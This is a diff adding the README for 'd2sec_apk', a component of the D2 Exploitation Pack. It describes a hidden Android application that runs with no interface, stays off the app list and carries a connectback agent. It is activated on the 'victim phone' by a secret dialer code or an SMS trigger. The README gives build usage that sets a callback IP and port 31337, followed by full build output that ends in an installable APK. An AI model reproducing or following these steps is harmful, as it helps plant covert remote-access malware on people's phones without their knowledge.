@@ -1,0 +1,111 @@
+D2 Exploitation Pack
+
+Copyright (c) 2007-2011 DSquare Security, LLC
+All rights reserved.
+
+License information
+---------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Description
+-------------
+
+d2sec_apk is a malicious Android application (in debug mode) with an embedded
+Java Mosdef. This application doesn't appear in the applications list and has
+no GUI. To activate it, type the secret code *#*#1337#*#* on the victim phone
+or send a SMS to the victim phone with the following text ##D2SEC##. 
+
+The d2sec_apk.py script will configure AndroidManifest.xml with the
+specified Mosdef connectback Ip and Port. 
+
+You must have the Android SDK installed. See
+http://developer.android.com/sdk/index.html for more informations. After SDK
+installation, edit d2sec_apk/local.properties and set sdk.dir value.
+
+This application has been compiled and tested with the Android Virtual Device
+Target Android 2.3.3 - API Level 10 and with the phone HTC Wildfire S A510e.
+
+
+Usage
+------
+
+From a MacOS shell :
+
+$ python d2sec_apk.py 
+d2sec_apk (c) 2007-2011 DSquare Security
+See README for more informations ...
+
+[+] ant binary pathname : /usr/bin/ant
+[+] mosdef callback ip : 192.168.0.5
+[+] mosdef call port : 31337
+[*] copying d2sec_apk/AndroidManifest.xml to ./AndroidManifest.xml.orig
+[*] creating AndroidManifest.xml
+Buildfile: /Users/foo/d2sec_apk/build.xml
+    [setup] Android SDK Tools Revision 12
+    [setup] Project Target: Android 2.3.3
+    [setup] API level: 10
+    [setup] 
+    [setup] ------------------
+    [setup] Resolving library dependencies:
+    [setup] No library dependencies.
+    [setup] 
+    [setup] ------------------
+    [setup] 
+    [setup] WARNING: No minSdkVersion value set. Application will install on all Android versions.
+    [setup] 
+    [setup] Importing rules file: tools/ant/main_rules.xml
+
+-debug-obfuscation-check:
+
+-set-debug-mode:
+
+-compile-tested-if-test:
+
+-pre-build:
+
+-dirs:
+     [echo] Creating output directories if needed...
+    [mkdir] Created dir: /Users/foo/d2sec_apk/bin
+    [mkdir] Created dir: /Users/foo/d2sec_apk/gen
+    [mkdir] Created dir: /Users/foo/d2sec_apk/bin/classes
+
+-aidl:
+     [echo] Compiling aidl files into Java classes...
+
+-renderscript:
+     [echo] Compiling RenderScript files into Java classes and RenderScript bytecode...
+
+-resource-src:
+     [echo] Generating R.java / Manifest.java from the resources...
+
+-pre-compile:
+
+compile:
+    [javac] /Users/foo/android-sdk-mac_x86/tools/ant/main_rules.xml:384: warning: 'includeantruntime' was not set, defaulting to build.sysclasspath=last; set to false for repeatable builds
+    [javac] Compiling 4 source files to /Users/foo/d2sec_apk/bin/classes
+
+-post-compile:
+
+-obfuscate:
+
+-dex:
+     [echo] Converting compiled files and external libraries into /Users/foo/d2sec_apk/bin/classes.dex...
+
+-package-resources:
+     [echo] Packaging resources
+     [aapt] Creating full resource package...
+
+-package-debug-sign:
+[apkbuilder] Creating d2sec_apk-debug-unaligned.apk and signing it with a debug key...
+
+debug:
+     [echo] Running zip align on final apk...
+     [echo] Debug Package: /Users/foo/d2sec_apk/bin/d2sec_apk-debug.apk
+
+BUILD SUCCESSFUL
+Total time: 2 seconds
+[!] Android package d2sec_apk-debug.apk can be installed ...
+
